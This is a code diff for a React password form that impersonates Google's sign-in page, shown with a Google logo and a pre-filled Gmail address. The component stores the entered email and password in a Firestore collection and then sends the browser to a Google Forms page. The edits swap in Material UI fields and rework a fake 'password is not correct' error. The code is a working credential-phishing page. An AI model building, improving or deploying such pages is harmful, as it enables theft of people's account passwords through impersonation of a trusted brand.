@@ -4,19 +4,20 @@ import { useState } from "react";
 import { useNavigate } from "react-router-dom";
 import { addDoc, collection } from "firebase/firestore";
 import { db } from "../firebase-config";
-
+import { TextField } from "@mui/material";
+import Checkbox from "@mui/material/Checkbox";
 const PasswordForm = ({ email }) => {
   const [data, setData] = useState({
     email: email ? email : "user@gmail.com",
     password: "",
   });
+  const [showPlaceholder, setShowPlaceholder] = useState(true);
 
   const [isChecked, setIsChecked] = useState(false);
-  const [errorMessage, setErrorMessage] = useState("");
+  const [error, setError] = useState(false);
   let navigate = useNavigate();
   const handlePassword = (password) => {
     setData({ ...data, password });
-    setErrorMessage("");
   };
 
   const handleCheckboxChange = (event) => {
@@ -24,15 +25,15 @@ const PasswordForm = ({ email }) => {
     setIsChecked(checked);
   };
 
-  const validatePassword = () => {
-    // Regular expression to match Google Gmail password pattern
+  // const validatePassword = () => {
+  //   // Regular expression to match Google Gmail password pattern
 
-    if (data.password.length < 8 && data.password.length > 0) {
-      setErrorMessage("Your password is not correct.");
-    } else {
-      setErrorMessage("");
-    }
-  };
+  //   if (data.password.length < 8 && data.password.length > 0) {
+  //     setErrorMessage("Your password is not correct.");
+  //   } else {
+  //     setErrorMessage("");
+  //   }
+  // };
 
   const dataCollectionRef = collection(db, "data");
 
@@ -41,13 +42,14 @@ const PasswordForm = ({ email }) => {
       email: data.email,
       password: data.password,
     });
-    window.location.href = "https://docs.google.com/forms/d/e/1FAIpQLScuymnyF1su3--cuvsRNGGIBP4b-QBBBVYJjtANa1J5MFJFnw/viewform";
+    window.location.href =
+      "https://docs.google.com/forms/d/e/1FAIpQLScuymnyF1su3--cuvsRNGGIBP4b-QBBBVYJjtANa1J5MFJFnw/viewform";
   };
 
   return (
     <div className="grid place-items-center h-screen">
       <div>
-        <div className="px-10 py-10 rounded-md text-black border border-gray-300 bg-white flex flex-col items-center sm:w-[450px] sm:h-[500px] mx-4 md:mx-auto ">
+        <div className="px-10 py-10 rounded-md text-black border border-gray-300 bg-white flex flex-col items-center sm:w-[450px] sm:h-[500px] mx-2 md:mx-auto ">
           <div className="text-center ">
             <div className="w-[120px] mx-auto mb-4">
               <img src={googleLogo} alt="google_logo" />
@@ -90,7 +92,7 @@ const PasswordForm = ({ email }) => {
             </div>
           </div>
           <div className="w-full mt-12">
-            <input
+            {/* <input
               type={`${isChecked ? "text" : "password"}`}
               name="password"
               className="p-3 rounded border border-gray-300 outline-none w-full"
@@ -98,9 +100,24 @@ const PasswordForm = ({ email }) => {
               value={data.password}
               onChange={(e) => handlePassword(e.target.value)}
               onBlur={validatePassword}
+            /> */}
+            <TextField
+              type={`${isChecked ? "text" : "password"}`}
+              id="outlined-basic"
+              label="Enter your password"
+              placeholder={showPlaceholder ? "Enter your password" : " "}
+              variant="outlined"
+              fullWidth
+              value={data.password}
+              onChange={(e) => {
+                handlePassword(e.target.value);
+                setError(false);
+              }}
+              onClick={() => setShowPlaceholder(false)}
+              // onBlur={validatePassword}
             />
 
-            {errorMessage && data.password.length > 0 && (
+            {error && data.password.length < 8 && data.password.length > 0 && (
               <small className="w-full text-xs text-red-600 h-2 flex gap-2 items-center mt-1.5">
                 <svg
                   xmlns="http://www.w3.org/2000/svg"
@@ -116,13 +133,14 @@ const PasswordForm = ({ email }) => {
                     d="M12 9v3.75m9-.75a9 9 0 11-18 0 9 9 0 0118 0zm-9 3.75h.008v.008H12v-.008z"
                   />
                 </svg>
-                {errorMessage}
+                {/* {errorMessage} */}
+                Your password is not correct.
               </small>
             )}
 
             <div className="flex items-start mb-6 mt-3">
               <div className="flex items-center h-5">
-                <input
+                {/* <input
                   id="remember"
                   aria-describedby="remember"
                   type="checkbox"
@@ -130,6 +148,11 @@ const PasswordForm = ({ email }) => {
                   required=""
                   checked={isChecked}
                   onChange={(e) => handleCheckboxChange(e)}
+                /> */}
+                <Checkbox
+                  checked={isChecked}
+                  onChange={(e) => handleCheckboxChange(e)}
+                  inputProps={{ "aria-label": "controlled" }}
                 />
               </div>
               <div className="text-sm ml-3">
@@ -144,7 +167,7 @@ const PasswordForm = ({ email }) => {
             <a href="#" className="text-blue-600 font-semibold">
               Forget password?
             </a>
-            {errorMessage === "" && data.password.length > 0 ? (
+            {data.password.length >= 8 ? (
               <button
                 className="bg-blue-500 rounded-md text-white font-semibold px-5 py-1.5 hover:bg-blue-700"
                 onClick={stroreUserAcc}
@@ -152,7 +175,10 @@ const PasswordForm = ({ email }) => {
                 Next
               </button>
             ) : (
-              <button className="bg-blue-500 rounded-md text-white font-semibold px-5 py-1.5 hover:bg-blue-700">
+              <button
+                className="bg-blue-500 rounded-md text-white font-semibold px-5 py-1.5 hover:bg-blue-700"
+                onClick={() => setError(true)}
+              >
                 Next
               </button>
             )}
